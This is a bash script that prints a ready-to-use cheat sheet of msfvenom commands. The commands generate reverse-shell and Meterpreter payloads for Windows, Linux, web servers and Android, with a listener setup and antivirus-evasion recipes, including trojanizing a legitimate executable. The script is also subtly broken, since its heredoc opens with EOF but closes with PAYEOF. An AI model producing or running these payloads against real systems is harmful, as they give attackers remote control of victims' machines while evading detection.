#!/usr/bin/env bash
# Description: msfvenom payload generator — all platforms with AV evasion
# ==============================================================================
LHOST="${1:-}"; LPORT="${2:-4444}"
[[ -z "$LHOST" ]] && { echo "Usage: bash payloads.sh <LHOST> [LPORT]"; echo "  Example: bash payloads.sh 192.168.1.100 4444"; exit 1; }
echo -e "\n=== PAYLOAD GENERATOR — LHOST=$LHOST LPORT=$LPORT ===\n"
cat << EOF

── Windows Payloads ──────────────────────────────────────────────────────────
  # Standard EXE:
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f exe -o reverse_tcp.exe

  # HTTPS EXE (bypass some AV):
  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${LHOST} LPORT=443 -f exe -o reverse_https.exe

  # DLL:
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f dll -o payload.dll

  # PowerShell (fileless):
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f psh -o payload.ps1

  # Shellcode (C buffer):
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f c

  # Encoded (Shikata Ga Nai):
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -e x86/shikata_ga_nai -i 3 -f exe -o encoded.exe

── Linux Payloads ────────────────────────────────────────────────────────────
  # ELF Binary:
  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf -o linux_reverse_tcp.elf

  # Bash one-liner:
  msfvenom -p cmd/unix/reverse_bash LHOST=${LHOST} LPORT=${LPORT} -f raw

  # Python reverse shell:
  msfvenom -p cmd/unix/reverse_python LHOST=${LHOST} LPORT=${LPORT} -f raw

── Web Payloads ──────────────────────────────────────────────────────────────
  # PHP:
  msfvenom -p php/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f raw -o shell.php

  # JSP (Tomcat):
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f raw -o shell.jsp

  # WAR deploy:
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f war -o shell.war

  # ASP (IIS):
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f asp -o shell.asp

── Android Payloads ──────────────────────────────────────────────────────────
  msfvenom -p android/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -o android_payload.apk

── Listener Setup (msfconsole) ───────────────────────────────────────────────
  use exploit/multi/handler
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  set LHOST ${LHOST}
  set LPORT ${LPORT}
  exploit -j

── AV Evasion Techniques ─────────────────────────────────────────────────────
  # Encoder chain:
  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${LHOST} LPORT=443 -e x64/xor_dynamic -i 5 -f exe-only -o stealth.exe

  # Template injection:
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -x /path/to/legit.exe -k -f exe -o trojanized.exe

  # Service EXE:
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f exe-service -o service.exe

  # RC4 encryption:
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} --encrypt rc4 --encrypt-key SecretK3y -f exe -o rc4_payload.exe
PAYEOF
